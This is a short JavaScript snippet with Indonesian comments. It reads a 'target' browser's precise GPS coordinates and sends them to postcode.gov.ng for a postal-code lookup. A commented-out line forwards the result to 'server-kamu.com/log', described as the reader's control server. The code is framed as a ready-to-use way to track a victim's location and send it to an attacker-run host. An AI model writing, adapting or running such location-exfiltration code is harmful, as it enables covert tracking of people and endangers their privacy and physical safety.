(async function() {
    // 1. Ambil koordinat GPS dari browser target
    const getPosition = () => {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation tidak didukung oleh browser ini.'));
            } else {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
        });
    };

    try {
        const position = await getPosition();
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        console.log(`Koordinat didapat: ${lat}, ${lon}`);

        // 2. Kirim atau query ke target web server / endpoint postcode
        // Menggunakan fetch untuk berinteraksi dengan form/API postcode.gov.ng
        const response = await fetch('https://postcode.gov.ng/find', {
            method: 'POST', // Sesuaikan dengan method form target (GET/POST)
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ latitude: lat, longitude: lon })
        });

        const result = await response.json();
        console.log('Postal Code Result:', result);
        
        // Kirim balik hasilnya ke server pengendali kamu jika diperlukan
        // fetch('https://server-kamu.com/log', { method: 'POST', body: JSON.stringify(result) });

    } catch (error) {
        console.error('Gagal mengeksekusi:', error.message);
    }
})();
